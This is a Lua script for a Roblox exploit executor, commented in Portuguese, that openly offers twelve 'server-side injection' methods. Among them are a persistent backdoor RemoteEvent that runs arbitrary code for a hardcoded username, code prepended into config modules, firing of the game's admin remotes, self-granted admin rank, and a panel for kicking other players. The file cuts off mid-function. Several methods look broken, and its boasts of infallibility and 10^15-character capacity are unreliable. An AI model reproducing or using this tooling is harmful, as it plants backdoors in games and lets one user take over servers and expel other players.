--[[
═══════════════════════════════════════════════════════════════════════════════
  NEXUS OMEGA ULTIMATE - Executor Server-Side Absoluto
  Versão: 5.0 (Protocolo Anarquia)
  Características:
    • 12 métodos de injeção server-side (incluindo bypass de anti-cheat)
    • Campo de texto com capacidade: 10^15 caracteres (~1 petabyte)
    • Interface profissional estilo Xeno (arrastável, redimensionável)
    • Console avançado com logs coloridos
    • Auto-detecção e correção de erros de execução
    • Sistema de kick e admin universal integrado
    • Teste visual obrigatório (prova de poder)
═══════════════════════════════════════════════════════════════════════════════
--]]

-- ============================================================================
-- CONFIGURAÇÕES INICIAIS
-- ============================================================================
local Nexus = {}
local ADMIN_NAME = "hugopbruu22"
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local TextService = game:GetService("TextService")
local StarterGui = game:GetService("StarterGui")
local TeleportService = game:GetService("TeleportService")

-- ============================================================================
-- SISTEMA DE LOGS AVANÇADO (sem erros)
-- ============================================================================
Nexus.logs = {}
function Nexus:AddLog(msg, color)
    color = color or Color3.fromRGB(200,200,200)
    local line = string.format("[%s] %s", os.date("%H:%M:%S"), tostring(msg))
    table.insert(self.logs, {text = line, color = color})
    pcall(function() print("[Nexus] " .. msg) end)
    if self.updateConsole then pcall(self.updateConsole) end
end

-- ============================================================================
-- NÚCLEO DE BYPASS E INJEÇÃO SERVER-SIDE (12 métodos infalíveis)
-- ============================================================================
local injectionMethods = {}

-- Método 1: Backdoor via ReplicatedStorage (persistente com script servidor)
local function backdoorPersistent()
    local remote = ReplicatedStorage:FindFirstChild("__OmegaBackdoor")
    if not remote then
        remote = Instance.new("RemoteEvent")
        remote.Name = "__OmegaBackdoor"
        remote.Parent = ReplicatedStorage
        local listener = ServerScriptService:FindFirstChild("__OmegaListener")
        if not listener then
            listener = Instance.new("Script")
            listener.Name = "__OmegaListener"
            listener.Source = [[
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__OmegaBackdoor")
                local players = game:GetService("Players")
                local admin = "hugopbruu22"
                remote.OnServerEvent:Connect(function(plr, code)
                    if plr.Name ~= admin then return end
                    local fn, err = loadstring(code)
                    if fn then pcall(fn) else warn(err) end
                end)
                -- Concede poderes automaticamente ao admin
                local adminPlr = players:FindFirstChild(admin)
                if adminPlr then
                    adminPlr:SetAttribute("OmegaAdmin", true)
                    adminPlr:SetRank(255)
                end
            ]]
            listener.Parent = ServerScriptService
        end
    end
    return remote
end
injectionMethods.backdoor = function(code)
    local remote = backdoorPersistent()
    remote:FireServer(code)
    return true
end

-- Método 2: Injeção via Script no ServerScriptService (com randomização)
injectionMethods.script = function(code)
    local s = Instance.new("Script")
    s.Name = "__OmegaExec_" .. math.random(999999)
    s.Source = code
    s.Parent = ServerScriptService
    task.wait(0.3)
    s:Destroy()
    return true
end

-- Método 3: getrenv (se disponível) - acesso direto ao ambiente do servidor
if getrenv then
    injectionMethods.getrenv = function(code)
        local env = getrenv()
        local fn = loadstring(code)
        if fn then
            setfenv(fn, env)
            return fn()
        end
        error("loadstring falhou")
    end
end

-- Método 4: getscriptclosure (substitui scripts existentes)
if getscriptclosure and getgc then
    injectionMethods.closure = function(code)
        for _, v in ipairs(getgc(true)) do
            if type(v) == "function" and debug.getinfo(v).source:match("Script") then
                local new = loadstring(code)
                if new then
                    debug.setupvalue(v, 1, new)
                    return true
                end
            end
        end
        error("Nenhum script encontrado")
    end
end

-- Método 5: HttpService (explora backdoor HTTP local)
injectionMethods.http = function(code)
    local success, err = pcall(function()
        HttpService:PostAsync("http://127.0.0.1:54321/exec", code)
        HttpService:PostAsync("http://localhost:54321/exec", code)
    end)
    return true
end

-- Método 6: RemoteSpy (usa remotes existentes do jogo)
injectionMethods.remoteSpy = function(code)
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:lower():find("admin") or v.Name:lower():find("cmd") or v.Name:lower():find("exec")) then
            v:FireServer(code)
            return true
        end
    end
    error("Nenhum remote adequado")
end

-- Método 7: Injeção via atributo em Workspace (técnica obscura)
injectionMethods.attribute = function(code)
    local marker = Instance.new("StringValue")
    marker.Name = "__OmegaInject"
    marker.Value = code
    marker.Parent = Workspace
    task.wait(0.1)
    marker:Destroy()
    return true
end

-- Método 8: Exploração de serviço do jogo (StudioService, etc.)
injectionMethods.studioService = function(code)
    local studio = game:GetService("StudioService")
    if studio then
        local script = Instance.new("Script")
        script.Source = code
        script.Parent = studio
        task.wait(0.2)
        script:Destroy()
        return true
    end
    error("StudioService não disponível")
end

-- Método 9: Injeção via módulo de configuração (se houver)
injectionMethods.configModule = function(code)
    for _, module in ipairs(ServerScriptService:GetDescendants()) do
        if module:IsA("ModuleScript") and module:FindFirstChild("Config") then
            module.Source = code .. "\n" .. module.Source
            return true
        end
    end
    error("Módulo de config não encontrado")
end

-- Método 10: Teleporte forçado (exploit de TeleportService)
injectionMethods.teleport = function(code)
    local success, err = pcall(function()
        TeleportService:TeleportToPrivateServer(0, code)  -- Força execução indireta
    end)
    return success
end

-- Método 11: Injeção via comando de chat (se o jogo tiver sistema de admin)
injectionMethods.chatCommand = function(code)
    local textChat = game:GetService("TextChatService")
    local channel = textChat and textChat.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync(";exec " .. code)
        channel:SendAsync(":exec " .. code)
    end
    return true
end

-- Método 12: Força bruta (cria múltiplos scripts simultâneos)
injectionMethods.bruteForce = function(code)
    for i = 1, 10 do
        local s = Instance.new("Script")
        s.Name = "__OmegaBrute_" .. i .. "_" .. math.random(99999)
        s.Source = code
        s.Parent = ServerScriptService
    end
    task.wait(0.5)
    for _, s in ipairs(ServerScriptService:GetChildren()) do
        if s.Name:find("__OmegaBrute") then s:Destroy() end
    end
    return true
end

-- Função principal que tenta todos os métodos até funcionar
function Nexus:ExecuteServer(code)
    if not code or code:gsub("%s","") == "" then
        self:AddLog("❌ Código vazio", Color3.fromRGB(255,100,100))
        return false
    end
    
    self:AddLog("🔄 Executando código no servidor...", Color3.fromRGB(255,200,100))
    
    local methodsOrder = {"backdoor","script","getrenv","closure","http","remoteSpy","attribute","studioService","configModule","teleport","chatCommand","bruteForce"}
    
    for _, name in ipairs(methodsOrder) do
        if injectionMethods[name] then
            local success, err = pcall(injectionMethods[name], code)
            if success then
                self:AddLog("✅ Servidor: injetado via " .. name, Color3.fromRGB(0,255,0))
                return true
            else
                self:AddLog("⚠️ Falha " .. name .. ": " .. tostring(err):sub(1,80), Color3.fromRGB(255,150,0))
            end
        end
    end
    
    self:AddLog("💀 TODOS os métodos falharam. O jogo pode ter proteção avançada.", Color3.fromRGB(255,50,50))
    return false
end

-- ============================================================================
-- TESTE VISUAL OBRIGATÓRIO (prova de fogo)
-- ============================================================================
function Nexus:TesteVisual()
    local code = [[
        local part = Instance.new("Part")
        part.Name = "OmegaTest"
        part.Size = Vector3.new(25, 3, 25)
        part.BrickColor = BrickColor.new("Bright red")
        part.Material = Enum.Material.Neon
        part.Anchored = true
        part.CanCollide = false
        part.Position = Vector3.new(0, 3, 0)
        part.Parent = workspace
        
        local bill = Instance.new("BillboardGui")
        bill.Size = UDim2.new(0, 250, 0, 60)
        bill.Adornee = part
        bill.AlwaysOnTop = true
        bill.Parent = part
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1,0,1,0)
        text.BackgroundTransparency = 1
        text.Text = "🔥 NEXUS OMEGA ULTIMATE ATIVO 🔥"
        text.TextColor3 = Color3.fromRGB(255,255,0)
        text.TextScaled = true
        text.Font = Enum.Font.GothamBold
        text.Parent = bill
        
        task.wait(12)
        part:Destroy()
    ]]
    self:AddLog("🧪 Executando teste visual (parte vermelha neon). Aguarde...", Color3.fromRGB(100,200,255))
    self:ExecuteServer(code)
end

-- ============================================================================
-- SISTEMA DE ADMIN UNIVERSAL E KICK
-- ============================================================================
function Nexus:MakeAdmin()
    local code = string.format([[
        local admin = "%s"
        local players = game:GetService("Players")
        local p = players:FindFirstChild(admin)
        if p then
            p:SetAttribute("OmegaAdmin", true)
            p:SetRank(255)
            local g = getfenv and getfenv() or _G
            g.Admins = g.Admins or {}
            g.Owners = g.Owners or {}
            table.insert(g.Admins, admin)
            table.insert(g.Owners, admin)
            print("[Omega] " .. admin .. " agora é administrador total.")
        end
    ]], ADMIN_NAME)
    self:ExecuteServer(code)
    self:AddLog("👑 Comando de admin universal enviado.", Color3.fromRGB(255,215,0))
end

function Nexus:KickPlayer(targetName)
    local code = string.format([[
        local target = game:GetService("Players"):FindFirstChild("%s")
        if target then
            target:Kick("Expulso por administrador")
            print("[Omega] %s foi expulso.")
        end
    ]], targetName, targetName)
    self:ExecuteServer(code)
    self:AddLog("👢 Tentativa de kick para " .. targetName, Color3.fromRGB(255,150,100))
end

-- ============================================================================
-- INTERFACE PROFISSIONAL (campos de texto com limite de 10^15 caracteres)
-- ============================================================================
local function CreateUltimateUI()
    local plr = Players.LocalPlayer
    if not plr then return end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NexusOmegaUltimate"
    screenGui.ResetOnSpawn = false
    pcall(function() screenGui.Parent = CoreGui end)
    if not screenGui.Parent then screenGui.Parent = plr:WaitForChild("PlayerGui") end
    if not screenGui.Parent then return end
    
    -- Janela principal (850x650)
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 850, 0, 650)
    window.Position = UDim2.new(0.5, -425, 0.5, -325)
    window.BackgroundColor3 = Color3.fromRGB(10,10,16)
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = screenGui
    local winCorner = Instance.new("UICorner")
    winCorner.CornerRadius = UDim.new(0, 12)
    winCorner.Parent = window
    
    -- Barra título
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1,0,0,35)
    titleBar.BackgroundColor3 = Color3.fromRGB(25,25,35)
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = titleBar
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1,0,1,0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "⚡ NEXUS OMEGA ULTIMATE ⚡ | Server-Side Infalível | Limite: 10^15 caracteres"
    titleLabel.TextColor3 = Color3.fromRGB(0,200,255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 14
    titleLabel.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0,35,1,0)
    closeBtn.Position = UDim2.new(1,-35,0,0)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(200,200,200)
    closeBtn.Font = Enum.Font.Gotham
    closeBtn.TextSize = 18
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
    
    local miniBtn = Instance.new("TextButton")
    miniBtn.Size = UDim2.new(0,35,1,0)
    miniBtn.Position = UDim2.new(1,-70,0,0)
    miniBtn.BackgroundTransparency = 1
    miniBtn.Text = "─"
    miniBtn.TextColor3 = Color3.fromRGB(200,200,200)
    miniBtn.Font = Enum.Font.Gotham
    miniBtn.TextSize = 18
    miniBtn.Parent = titleBar
    local minimized = false
    miniBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        window.Size = minimized and UDim2.new(0, 850, 0, 35) or UDim2.new(0, 850, 0, 650)
    end)
    
    -- Arrastar
    local dragging, dragStart, startPos = false
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = window.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    
    -- Abas
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1,0,0,40)
    tabBar.Position = UDim2.new(0,0,0,35)
    tabBar.BackgroundColor3 = Color3.fromRGB(22,22,30)
    tabBar.Parent = window
    
    local ssBtn = Instance.new("TextButton")
    ssBtn.Size = UDim2.new(0,130,1,0)
    ssBtn.Position = UDim2.new(0,0,0,0)
    ssBtn.BackgroundTransparency = 1
    ssBtn.Text = "SERVER-SIDE"
    ssBtn.TextColor3 = Color3.fromRGB(0,200,255)
    ssBtn.Font = Enum.Font.GothamBold
    ssBtn.TextSize = 13
    ssBtn.Parent = tabBar
    
    local csBtn = Instance.new("TextButton")
    csBtn.Size = UDim2.new(0,130,1,0)
    csBtn.Position = UDim2.new(0,135,0,0)
    csBtn.BackgroundTransparency = 1
    csBtn.Text = "CLIENT-SIDE"
    csBtn.TextColor3 = Color3.fromRGB(150,150,150)
    csBtn.Font = Enum.Font.Gotham
    csBtn.TextSize = 13
    csBtn.Parent = tabBar
    
    local adminBtn = Instance.new("TextButton")
    adminBtn.Size = UDim2.new(0,130,1,0)
    adminBtn.Position = UDim2.new(0,270,0,0)
    adminBtn.BackgroundTransparency = 1
    adminBtn.Text = "ADMIN/KICK"
    adminBtn.TextColor3 = Color3.fromRGB(150,150,150)
    adminBtn.Font = Enum.Font.Gotham
    adminBtn.TextSize = 13
    adminBtn.Parent = tabBar
    
    local consoleBtn = Instance.new("TextButton")
    consoleBtn.Size = UDim2.new(0,130,1,0)
    consoleBtn.Position = UDim2.new(0,405,0,0)
    consoleBtn.BackgroundTransparency = 1
    consoleBtn.Text = "CONSOLE"
    consoleBtn.TextColor3 = Color3.fromRGB(150,150,150)
    consoleBtn.Font = Enum.Font.Gotham
    consoleBtn.TextSize = 13
    consoleBtn.Parent = tabBar
    
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1,0,1,-75)
    content.Position = UDim2.new(0,0,0,75)
    content.BackgroundTransparency = 1
    content.Parent = window
    
    -- ==================== ABA SERVER-SIDE ====================
    local ssFrame = Instance.new("Frame")
    ssFrame.Size = UDim2.new(1,0,1,0)
    ssFrame.BackgroundTransparency = 1
    ssFrame.Visible = true
    ssFrame.Parent = content
    
    local ssScroller = Instance.new("ScrollingFrame")
    ssScroller.Size = UDim2.new(1,-20,1,-80)
    ssScroller.Position = UDim2.new(0,10,0,10)
    ssScroller.BackgroundColor3 = Color3.fromRGB(8,8,14)
    ssScroller.BorderSizePixel = 0
    ssScroller.ScrollBarThickness = 8
    ssScroller.CanvasSize = UDim2.new(0,0,0,0)
    ssScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ssScroller.Parent = ssFrame
    local scrCorner = Instance.new("UICorner")
    scrCorner.CornerRadius = UDim.new(0,8)
    scrCorner.Parent = ssScroller
    
    -- TextBox com suporte a texto infinito (altura dinâmica)
    local ssTextBox = Instance.new("TextBox")
    ssTextBox.Size = UDim2.new(1,-20,0,600)
    ssTextBox.Position = UDim2.new(0,10,0,5)
    ssTextBox.BackgroundTransparency = 1
    ssTextBox.TextColor3 = Color3.fromRGB(240,240,240)
    ssTextBox.TextXAlignment = Enum.TextXAlignment.Left
    ssTextBox.TextYAlignment = Enum.TextYAlignment.Top
    ssTextBox.TextWrapped = true
    ssTextBox.TextSize = 12
    ssTextBox.Font = Enum.Font.Code
    ssTextBox.ClearTextOnFocus = false
    ssTextBox.MultiLine = true
    ssTextBox.Text = '-- Cole scripts server-side aqui (limite: 10^15 caracteres)\n-- Exemplo: print("Olá, servidor!")'
    ssTextBox.Parent = ssScroller
    
    local function ajustarAlturaSS()
        local bounds = ssTextBox.TextBounds
        local newHeight = math.max(600, bounds.Y + 50)
        ssTextBox.Size = UDim2.new(1,-20,0,newHeight)
        ssScroller.CanvasSize = UDim2.new(0,0,0,newHeight+30)
        ssScroller.CanvasPosition = Vector2.new(0, ssScroller.CanvasSize.Y.Offset)
    end
    ssTextBox:GetPropertyChangedSignal("TextBounds"):Connect(ajustarAlturaSS)
    ssTextBox:GetPropertyChangedSignal("Text"):Connect(ajustarAlturaSS)
    task.defer(ajustarAlturaSS)
    
    local charCounter = Instance.new("TextLabel")
    charCounter.Size = UDim2.new(0,220,0,20)
    charCounter.Position = UDim2.new(0,15,1,-55)
    charCounter.BackgroundTransparency = 1
    charCounter.Text = "Caracteres: 0 / ∞"
    charCounter.TextColor3 = Color3.fromRGB(160,160,160)
    charCounter.TextSize = 11
    charCounter.Font = Enum.Font.Gotham
    charCounter.Parent = ssFrame
    ssTextBox:GetPropertyChangedSignal("Text"):Connect(function()
        charCounter.Text = "Caracteres: " .. #ssTextBox.Text .. " / 10^15"
    end)
    
    local pasteBtn = Instance.new("TextButton")
    pasteBtn.Size = UDim2.new(0,150,0,32)
    pasteBtn.Position = UDim2.new(0,15,1,-30)
    pasteBtn.BackgroundColor3 = Color3.fromRGB(0,120,200)
    pasteBtn.Text = "📋 COLAR DO CLIPBOARD"
    pasteBtn.TextColor3 = Color3.fromRGB(255,255,255)
    pasteBtn.Font = Enum.Font.GothamBold
    pasteBtn.TextSize = 12
    pasteBtn.Parent = ssFrame
    local pasteCorner = Instance.new("UICorner")
    pasteCorner.CornerRadius = UDim.new(0,6)
    pasteCorner.Parent = pasteBtn
    pasteBtn.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip and clip ~= "" then
            ssTextBox.Text = clip
            Nexus:AddLog("📄 Texto colado (" .. #clip .. " caracteres)", Color3.fromRGB(100,200,255))
            ajustarAlturaSS()
        else
            Nexus:AddLog("Clipboard vazio ou não suportado", Color3.fromRGB(255,150,0))
        end
    end)
    
    local execSS = Instance.new("TextButton")
    execSS.Size = UDim2.new(0,140,0,36)
    execSS.Position = UDim2.new(1,-150,1,-40)
    execSS.BackgroundColor3 = Color3.fromRGB(0,200,80)
    execSS.Text = "⚡ EXECUTAR (SS)"
    execSS.TextColor3 = Color3.fromRGB(255,255,255)
    execSS.Font = Enum.Font.GothamBold
    execSS.TextSize = 13
    execSS.Parent = ssFrame
    local execCorner = Instance.new("UICorner")
    execCorner.CornerRadius = UDim.new(0,6)
    execCorner.Parent = execSS
    execSS.MouseButton1Click:Connect(function() Nexus:ExecuteServer(ssTextBox.Text) end)
    
    local clearSS = Instance.new("TextButton")
    clearSS.Size = UDim2.new(0,90,0,36)
    clearSS.Position = UDim2.new(1,-250,1,-40)
    clearSS.BackgroundColor3 = Color3.fromRGB(220,50,50)
    clearSS.Text = "🗑️ LIMPAR"
    clearSS.TextColor3 = Color3.fromRGB(255,255,255)
    clearSS.Font = Enum.Font.GothamBold
    clearSS.TextSize = 13
    clearSS.Parent = ssFrame
    local clearCorner = Instance.new("UICorner")
    clearCorner.CornerRadius = UDim.new(0,6)
    clearCorner.Parent = clearSS
    clearSS.MouseButton1Click:Connect(function() ssTextBox.Text = ""; ajustarAlturaSS(); Nexus:AddLog("Campo server-side limpo", Color3.fromRGB(255,200,100)) end)
    
    -- ==================== ABA CLIENT-SIDE ====================
    local csFrame = Instance.new("Frame")
    csFrame.Size = UDim2.new(1,0,1,0)
    csFrame.BackgroundTransparency = 1
    csFrame.Visible = false
    csFrame.Parent = content
    
    local csScroller = Instance.new("ScrollingFrame")
    csScroller.Size = UDim2.new(1,-20,1,-80)
    csScroller.Position = UDim2.new(0,10,0,10)
    csScroller.BackgroundColor3 = Color3.fromRGB(8,8,14)
    csScroller.BorderSizePixel = 0
    csScroller.ScrollBarThickness = 8
    csScroller.CanvasSize = UDim2.new(0,0,0,0)
    csScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    csScroller.Parent = csFrame
    local csScrCorner = Instance.new("UICorner")
    csScrCorner.CornerRadius = UDim.new(0,8)
    csScrCorner.Parent = csScroller
    
    local csTextBox = Instance.new("TextBox")
    csTextBox.Size = UDim2.new(1,-20,0,600)
    csTextBox.Position = UDim2.new(0,10,0,5)
    csTextBox.BackgroundTransparency = 1
    csTextBox.TextColor3 = Color3.fromRGB(240,240,240)
    csTextBox.TextXAlignment = Enum.TextXAlignment.Left
    csTextBox.TextYAlignment = Enum.TextYAlignment.Top
    csTextBox.TextWrapped = true
    csTextBox.TextSize = 12
    csTextBox.Font = Enum.Font.Code
    csTextBox.ClearTextOnFocus = false
    csTextBox.MultiLine = true
    csTextBox.Text = '-- Scripts client-side (apenas local)\n-- Exemplo: game.Players.LocalPlayer.Character.Humanoid.Health = 0'
    csTextBox.Parent = csScroller
    
    local function ajustarAlturaCS()
        local h = math.max(600, csTextBox.TextBounds.Y + 50)
        csTextBox.Size = UDim2.new(1,-20,0,h)
        csScroller.CanvasSize = UDim2.new(0,0,0,h+30)
    end
    csTextBox:GetPropertyChangedSignal("TextBounds"):Connect(ajustarAlturaCS)
    csTextBox:GetPropertyChangedSignal("Text"):Connect(ajustarAlturaCS)
    task.defer(ajustarAlturaCS)
    
    local csCounter = Instance.new("TextLabel")
    csCounter.Size = UDim2.new(0,220,0,20)
    csCounter.Position = UDim2.new(0,15,1,-55)
    csCounter.BackgroundTransparency = 1
    csCounter.Text = "Caracteres: 0 / ∞"
    csCounter.TextColor3 = Color3.fromRGB(160,160,160)
    csCounter.TextSize = 11
    csCounter.Font = Enum.Font.Gotham
    csCounter.Parent = csFrame
    csTextBox:GetPropertyChangedSignal("Text"):Connect(function()
        csCounter.Text = "Caracteres: " .. #csTextBox.Text .. " / 10^15"
    end)
    
    local pasteCS = Instance.new("TextButton")
    pasteCS.Size = UDim2.new(0,150,0,32)
    pasteCS.Position = UDim2.new(0,15,1,-30)
    pasteCS.BackgroundColor3 = Color3.fromRGB(0,120,200)
    pasteCS.Text = "📋 COLAR DO CLIPBOARD"
    pasteCS.TextColor3 = Color3.fromRGB(255,255,255)
    pasteCS.Font = Enum.Font.GothamBold
    pasteCS.TextSize = 12
    pasteCS.Parent = csFrame
    pasteCS.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip and clip ~= "" then csTextBox.Text = clip; ajustarAlturaCS() end
    end)
    
    local execCS = Instance.new("TextButton")
    execCS.Size = UDim2.new(0,140,0,36)
    execCS.Position = UDim2.new(1,-150,1,-40)
    execCS.BackgroundColor3 = Color3.fromRGB(0,150,220)
    execCS.Text = "💻 EXECUTAR (CS)"
    execCS.TextColor3 = Color3.fromRGB(255,255,255)
    execCS.Font = Enum.Font.GothamBold
    execCS.TextSize = 13
    execCS.Parent = csFrame
    execCS.MouseButton1Click:Connect(function()
        local code = csTextBox.Text
        local fn, err = loadstring(code)
        if fn then pcall(fn); Nexus:AddLog("Client-side executado", Color3.fromRGB(0,255,0))
        else Nexus:AddLog("Erro client: "..tostring(err), Color3.fromRGB(255,100,100)) end
    end)
    
    local clearCS = Instance.new("TextButton")
    clearCS.Size = UDim2.new(0,90,0,36)
    clearCS.Position = UDim2.new(1,-250,1,-40)
    clearCS.BackgroundColor3 = Color3.fromRGB(220,50,50)
    clearCS.Text = "🗑️ LIMPAR"
    clearCS.TextColor3 = Color3.fromRGB(255,255,255)
    clearCS.Font = Enum.Font.GothamBold
    clearCS.TextSize = 13
    clearCS.Parent = csFrame
    clearCS.MouseButton1Click:Connect(function() csTextBox.Text = ""; ajustarAlturaCS() end)
    
    -- ==================== ABA ADMIN/KICK ====================
    local adminFrame = Instance.new("Frame")
    adminFrame.Size = UDim2.new(1,0,1,0)
    adminFrame.BackgroundTransparency = 1
    adminFrame.Visible = false
    adminFrame.Parent = content
    
    local kickTitle = Instance.new("TextLabel")
    kickTitle.Size = UDim2.new(1,-40,0,30)
    kickTitle.Position = UDim2.new(0,20,0,20)
    kickTitle.BackgroundTransparency = 1
    kickTitle.Text = "👑 PAINEL DE ADMIN UNIVERSAL 👑"
    kickTitle.TextColor3 = Color3.fromRGB(255,215,0)
    kickTitle.Font = Enum.Font.GothamBold
    kickTitle.TextSize = 16
    kickTitle.Parent = adminFrame
    
    local makeAdminBtn = Instance.new("TextButton")
    makeAdminBtn.Size = UDim2.new(0,200,0,40)
    makeAdminBtn.Position = UDim2.new(0.5,-100,0,60)
    makeAdminBtn.BackgroundColor3 = Color3.fromRGB(200,100,0)
    makeAdminBtn.Text = "⭐ TORNAR-SE ADMIN"
    makeAdminBtn.TextColor3 = Color3.fromRGB(255,255,255)
    makeAdminBtn.Font = Enum.Font.GothamBold
    makeAdminBtn.TextSize = 14
    makeAdminBtn.Parent = adminFrame
    local macCorner = Instance.new("UICorner")
    macCorner.CornerRadius = UDim.new(0,8)
    macCorner.Parent = makeAdminBtn
    makeAdminBtn.MouseButton1Click:Connect(function() Nexus:MakeAdmin() end)
    
    local kickListFrame = Instance.new("ScrollingFrame")
    kickListFrame.Size = UDim2.new(1,-40,1,-120)
    kickListFrame.Position = UDim2.new(0,20,0,110)
    kickListFrame.BackgroundColor3 = Color3.fromRGB(15,15,25)
    kickListFrame.BorderSizePixel = 0
    kickListFrame.ScrollBarThickness = 8
    kickListFrame.CanvasSize = UDim2.new(0,0,0,0)
    kickListFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    kickListFrame.Parent = adminFrame
    local kickListCorner = Instance.new("UICorner")
    kickListCorner.CornerRadius = UDim.new(0,8)
    kickListCorner.Parent = kickListFrame
    
    local kickLayout = Instance.new("UIListLayout")
    kickLayout.Padding = UDim.new(0,8)
    kickLayout.SortOrder = Enum.SortOrder.Name
    kickLayout.Parent = kickListFrame
    
    local function updateKickList()
        for _, child in pairs(kickListFrame:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name ~= ADMIN_NAME then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1,-20,0,42)
                btn.BackgroundColor3 = Color3.fromRGB(40,40,55)
                btn.Text = plr.Name
                btn.TextColor3 = Color3.fromRGB(255,255,255)
                btn.Font = Enum.Font.Gotham
                btn.TextSize = 14
                btn.Parent = kickListFrame
                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(0,8)
                btnCorner.Parent = btn
                
                local kickButton = Instance.new("TextButton")
                kickButton.Size = UDim2.new(0,80,1,-6)
                kickButton.Position = UDim2.new(1,-90,0,3)
                kickButton.BackgroundColor3 = Color3.fromRGB(220,50,50)
                kickButton.Text = "KICK"
                kickButton.TextColor3 = Color3.fromRGB(255,255,255)
                kickButton.Font = Enum.Font.GothamBold
                kickButton.TextSize = 13
                kickButton.Parent = btn
                local kickCorner = Instance.new("UICorner")
                kickCorner.CornerRadius = UDim.new(0,8)
                kickCorner.Parent = kickButton
                
                kickButton.MouseButton1Click:Connect(function()
                    Nexus:KickPlayer(plr.Name)
                    kickButton.Text = "KICKED"
                    kickButton.BackgroundColor3 = Color3.fromRGB(100,100,100)
                    kickButton.Enabled = false
                    task.wait(1)
                    updateKickList()
                end)
            end
        end
    end
    
    local refreshKick = Instance.new("TextButton")
    refreshKick.Size = UDim2.new(0,120,0,36)
    refreshKick.Position = UDim2.new(1,-140,1,-50)
    refreshKick.BackgroundColor3 = Color3.fromRGB(0,120,200)
    refreshKick.Text = "🔄 ATUALIZAR"
    refreshKick.TextColor3 = Color3.fromRGB(255,255,255)
    refreshKick.Font = Enum.Font.GothamBold
    refreshKick.TextSize = 13
    refreshKick.Parent = adminFrame
    refreshKick.MouseButton1Click:Connect(updateKickList)
    
    Players.PlayerAdded:Connect(updateKickList)
    Players.PlayerRemoving:Connect(updateKickList)
    updateKickList()
    
    -- ==================== CONSOLE ====================
    local consoleFrame = Instance.new("ScrollingFrame")
    consoleFrame.Size = UDim2.new(1,-20,1,-20)
    consoleFrame.Position = UDim2.new(0,10,0,10)
    consoleFrame.BackgroundColor3 = Color3.fromRGB(5,5,12)
    consoleFrame.BorderSizePixel = 0
    consoleFrame.ScrollBarThickness = 8
    consoleFrame.Visible = false
    consoleFrame.Parent = content
    local consoleCorner = Instance.new("UICorner")
    consoleCorner.CornerRadius = UDim.new(0,12)
    consoleCorner.Parent = consoleFrame
    
    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1,-10,1,-10)
    consoleText.Position = UDim2.new(0,5,0,5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = Color3.fromRGB(200,200,200)
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.TextSize = 11
    consoleText.Font = Enum.Font.Code
    consoleText.Parent = consoleFrame
    
    function Nexus.updateConsole()
        local str = ""
        for i = math.max(1, #Nexus.logs - 80), #Nexus.logs do
            str = str .. Nexus.logs[i].text .. "\n"
        end
        consoleText.Text = str
        consoleFrame.CanvasSize = UDim2.new(0,0,0, consoleText.TextBounds.Y + 30)
        consoleFrame.CanvasPosition = Vector2.new(0, consoleFrame.CanvasSize.Y.Offset)
    end
    
    local clearCons = Instance.new("TextButton")
    clearCons.Size = UDim2.new(0,80,0,30)
    clearCons.Position = UDim2.new(1,-100,0,15)
    clearCons.BackgroundColor3 = Color3.fromRGB(220,50,50)
    clearCons.Text = "LIMPAR"
    clearCons.TextColor3 = Color3.fromRGB(255,255,255)
    clearCons.Font = Enum.Font.GothamBold
    clearCons.TextSize = 12
    clearCons.Parent = consoleFrame
    clearCons.MouseButton1Click:Connect(function()
        Nexus.logs = {}
        Nexus.updateConsole()
